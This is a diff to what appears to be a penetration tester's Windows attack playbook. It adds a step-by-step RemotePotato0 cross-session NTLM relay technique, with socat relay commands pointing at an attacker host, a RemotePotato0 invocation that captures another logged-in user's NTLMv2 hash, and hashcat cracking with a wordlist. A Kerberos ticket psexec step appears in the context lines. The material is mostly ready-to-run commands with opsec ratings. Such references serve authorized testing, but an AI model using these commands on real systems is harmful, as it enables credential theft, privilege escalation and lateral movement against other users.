@@ -224,3 +224,30 @@
   # Step 3: Use ticket
   KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass <TARGET_FQDN>
   ```
+
+### Cross-Session Relay via RemotePotato0 [added: 2026-04]
+- **Tags:** #NTLMRelay #CrossSessionRelay #RemotePotato0 #NTLMv2 #SessionHijack #COM #RPC #PrivEsc #LateralMovement
+- **Trigger:** Active interactive RDP session found on box (`qwinsta` shows another user in State=Active/session ID ≥1); you have code execution as a different low-priv user
+- **Prereq:** Code execution on target; a second user has an active interactive session (RDP session ID ≥1); attacker port 135 is FREE (no Responder/ntlmrelayx holding it)
+- **Yields:** NTLMv2 hash of the target session user → crack for cleartext password → lateral movement
+- **Opsec:** Med (spawns COM object in target session; network callback to attacker)
+- **Context:** When two users are on the same box and you control one, RemotePotato0 forces the other user's session to authenticate to a rogue OXID resolver via socat relay. RemotePotato0 captures the NTLMv2 hash itself — no separate capture tool needed.
+- **Payload/Method:**
+  ```bash
+  # 0. CRITICAL: verify port 135 is free on attacker before anything else
+  sudo lsof -i:135   # kill Responder/ntlmrelayx if present
+
+  # 1. Identify active sessions
+  qwinsta
+  # Look for: rdp-tcp#N   victim_user   1   Active
+
+  # 2. On attacker: relay port 135 → victim port 8888 (RemotePotato0's fake OXID server)
+  sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET_IP>:8888
+
+  # 3. On victim: trigger — RemotePotato0 prints NTLMv2 hash directly in output
+  .\RemotePotato0.exe -m 2 -r <ATTACKER_IP> -x <ATTACKER_IP> -p 8888 -s <SESSION_ID>
+  # -s = RDP session ID of victim (from qwinsta, e.g. 1)
+
+  # 4. Crack captured NTLMv2 hash
+  hashcat -m 5600 hash.txt /opt/Pentester/ptTools/Wordlists/rockyou.txt
+  ```
